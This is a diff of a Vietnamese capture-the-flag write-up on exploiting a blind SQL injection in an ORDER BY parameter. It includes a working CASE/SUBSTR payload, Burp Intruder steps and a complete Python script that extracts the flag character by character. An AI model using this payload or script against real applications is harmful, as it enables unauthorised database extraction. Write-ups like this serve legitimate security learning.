@@ -123,15 +123,13 @@ else:
     ).order_by(text(order))
 ```
 
-Sẽ thực hiện query SQL → khả năng cao bài này khai thác SQLi (lỗi mà bên công ty bảo mật B... à mà thôi 🤡) 
+Thực hiện truy vấn SQL để tìm tên kim loại. Ở đây, method `order_by()` sẽ sử dụng dữ liệu trực tiếp từ user -> ta sẽ khai thác SQLi ở param này
 
 Dựng server từ source code được cung cấp. Thử bấm bừa `order=abc` ta thấy bị code 500 (do không có cột nào tên là `abc`). Đọc log được query mà server sử dụng.
 
 ![Untitled](writeup_media/Untitled%2013.png)
 
-Như vậy, param `search` không thể (hoặc rất khó) bị khai thác. Nhưng phần `ORDER BY` lại là raw query sử dụng param `order` do ta kiểm soát.
-
-Sau một hồi thử và sai và thử và sai, mình craft được payload cho param`order`như sau , trong đó `§pos§` và `§char§` là 2 vị trí mà ta sẽ sử dụng để brute-force ký tự trong flag
+Sau một hồi thử và sai và thử và sai, mình craft được payload cho param `order` như sau , trong đó `§pos§` và `§char§` là 2 vị trí mà ta sẽ sử dụng để brute-force ký tự trong flag
 
 ```sql
 (SELECT CASE
@@ -158,7 +156,7 @@ Query trên sẽ tìm những nguyên tố có tên thỏa mãn và sort nó the
 
 Cục `(SELECT ... END)` trên sẽ trả về cột `atomic_number` nếu mã hex của kí tự thứ `§pos§` trong flag là `§char§`, nếu không thì trả về cột `name`.
 
-Do đó, nếu giữ nguyên giá trị của param `search` và thay đổi gia trị của `§pos§` và `§char§`, ta có thể mò được từng ký tự trong flag bằng cách xem sự thay đổi của thứ tự các nguyên tố.
+Do đó, nếu giữ nguyên giá trị của param `search` và thay đổi gia trị của `§pos§` và `§char§`, ta có thể mò được từng ký tự trong flag bằng cách xem sự thay đổi của thứ tự các nguyên tố trong bảng.
 
 Giả sử `§pos§` = `1`, `§char§` = `f`, ta được danh sách sort theo cột `atomic_number` nếu ký tự thứ `1` là `f`.
 
@@ -167,6 +165,10 @@ Giả sử `§pos§` = `1`, `§char§` = `f`, ta được danh sách sort theo c
 Thử `§pos§` = `1`, `§char§` = `g`, ta được danh sách sort theo cột `name` → ký tự thứ `1` không phải `g`
 
 ![Untitled](writeup_media/Untitled%2015.png)
+
+Phân tích đã xong, bắt tay vào brute-force flag nào!
+
+## Cách 1: dùng Burp Suit (pro)
 
 Bắn vào Intruder, để payload set 1 (`§pos§`) là số từ 1-30 (số lượng ký tự trong flag) và payload set 2 (`§char§`) là các ký tự `[a-z{}]` (phần mô tả có nói định dạng flag chall này).
 
@@ -183,6 +185,74 @@ Ngoài ra ta cũng cần cài đặt thêm grep ở trong option để dễ dàn
 Bắt đầu attack. Đợi một lúc rồi sort theo số thứ tự + phần grep và voilà, flag đã hiện ngay trước mặt ta.
 
 ![Untitled](writeup_media/Untitled%2018.png)
+
+## Cách 2: dùng Python
+
+```python
+import asyncio
+import time
+
+import aiohttp
+import string
+
+URL = 'http://challenge.nahamcon.com:31140'
+
+AVAIL_CHAR = string.ascii_lowercase + '{}_'
+
+async def post(s: aiohttp.ClientSession, pos, char):
+    """
+    Send a POST request
+    :param s: request session
+    :param pos: position to check
+    :param char: character to check
+    :return: response's body in bytes
+    """
+    try:
+        data = {
+            'search': 'a',
+            'order': f'(SELECT CASE WHEN (SELECT HEX(SUBSTR(flag, {pos}, 1)) FROM flag) = HEX(\'{char}\') THEN atomic_number ELSE name END)'
+        }
+        async with s.post(url=URL, data=data) as res:
+            return await res.read()
+
+    except Exception as e:
+        print(f"Unable to POST due to {e}")
+        return None
+
+async def post_proc(s: aiohttp.ClientSession, pos, char):
+    """
+    Handle sending a POST request and analyze the response
+    :param s: request session
+    :param pos: position to check
+    :param char: character to check
+    :return: None if response is invalid or boolean check is failed, else return tuple (pos, char)
+    """
+    res = await post(s, pos, char)
+
+    if res is None:
+        return None
+
+    return (pos, char) if res.find(b'Actinium') > res.find(b'Magnesium') else None
+
+def parse_flag(res):
+    flag = [x for x in res if x is not None]
+    print(flag)
+    return ''.join([x[1] for x in flag])
+
+async def main():
+    async with aiohttp.ClientSession() as s:
+        res = []
+
+        # avoid using 2 for loop in asyncio.gather() due to server's overload
+        for pos in range(1, 31):
+            res += await asyncio.gather(*[post_proc(s, pos, char) for char in AVAIL_CHAR])
+            print(parse_flag(res))
+
+if __name__ == '__main__':
+    asyncio.run(main())
+    time.sleep(1)
+    print('Done')
+```
 
 <aside>
 🚩 flag{order_by_blind}
